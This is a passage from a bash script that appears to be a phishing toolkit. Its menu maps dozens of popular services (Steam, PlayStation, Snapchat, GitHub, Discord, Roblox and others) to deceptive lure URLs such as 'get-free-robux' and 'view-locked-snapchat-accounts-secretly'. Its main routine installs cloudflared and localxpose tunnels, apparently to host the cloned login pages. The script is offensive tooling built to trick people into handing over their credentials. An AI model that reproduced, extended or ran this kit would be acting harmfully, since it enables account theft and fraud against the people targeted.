			mask='https://steam-500-usd-gift-card-free'
			tunnel_menu;;
		8 | 08)
			website="twitter"
			mask='https://get-blue-badge-on-twitter-free'
			tunnel_menu;;
		9 | 09)
			website="playstation"
			mask='https://playstation-500-usd-gift-card-free'
			tunnel_menu;;
		10)
			website="tiktok"
			mask='https://tiktok-free-liker'
			tunnel_menu;;
		11)
			website="twitch"
			mask='https://unlimited-twitch-tv-user-for-free'
			tunnel_menu;;
		12)
			website="pinterest"
			mask='https://get-a-premium-plan-for-pinterest-free'
			tunnel_menu;;
		13)
			website="snapchat"
			mask='https://view-locked-snapchat-accounts-secretly'
			tunnel_menu;;
		14)
			website="linkedin"
			mask='https://get-a-premium-plan-for-linkedin-free'
			tunnel_menu;;
		15)
			website="ebay"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		16)
			website="quora"
			mask='https://quora-premium-for-free'
			tunnel_menu;;
		17)
			website="protonmail"
			mask='https://protonmail-pro-basics-for-free'
			tunnel_menu;;
		18)
			website="spotify"
			mask='https://convert-your-account-to-spotify-premium'
			tunnel_menu;;
		19)
			website="reddit"
			mask='https://reddit-official-verified-member-badge'
			tunnel_menu;;
		20)
			website="adobe"
			mask='https://get-adobe-lifetime-pro-membership-free'
			tunnel_menu;;
		21)
			website="deviantart"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		22)
			website="badoo"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		23)
			website="origin"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		24)
			website="dropbox"
			mask='https://get-1TB-cloud-storage-free'
			tunnel_menu;;
		25)
			website="yahoo"
			mask='https://grab-mail-from-anyother-yahoo-account-free'
			tunnel_menu;;
		26)
			website="wordpress"
			mask='https://unlimited-wordpress-traffic-free'
			tunnel_menu;;
		27)
			website="yandex"
			mask='https://grab-mail-from-anyother-yandex-account-free'
			tunnel_menu;;
		28)
			website="stackoverflow"
			mask='https://get-stackoverflow-lifetime-pro-membership-free'
			tunnel_menu;;
		29)
			site_vk;;
		30)
			website="xbox"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		31)
			website="mediafire"
			mask='https://get-1TB-on-mediafire-free'
			tunnel_menu;;
		32)
			website="gitlab"
			mask='https://get-1k-followers-on-gitlab-free'
			tunnel_menu;;
		33)
			website="github"
			mask='https://get-1k-followers-on-github-free'
			tunnel_menu;;
		34)
			website="discord"
			mask='https://get-discord-nitro-free'
			tunnel_menu;;
		35)
			website="roblox"
			mask='https://get-free-robux'
			tunnel_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Main
kill_pid
dependencies
check_status
install_cloudflared
install_localxpose
main_menu
